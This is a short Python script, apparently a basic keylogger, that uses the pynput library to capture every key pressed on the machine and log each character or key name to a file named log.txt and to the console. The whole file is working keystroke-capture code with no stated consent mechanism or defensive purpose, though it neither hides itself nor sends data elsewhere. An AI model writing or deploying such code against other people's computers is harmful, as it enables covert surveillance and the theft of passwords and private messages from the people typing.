from pynput import keyboard
import logging

for handler in logging.root.handlers[:]:
    logging.root.removeHandler(handler)
logging.basicConfig(level=logging.DEBUG,
                    format='%(message)s',
                    datefmt='%a, %d %b %Y %H:%M:%S',
                    filename= 'log.txt',
                    filemode='w')
console = logging.StreamHandler()
console.setLevel(logging.INFO)
# add the handler to the root logger
logging.getLogger().addHandler(console)


def on_press(key):
    try:
        logging.info(str(key.char))
    except:
        logging.info(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()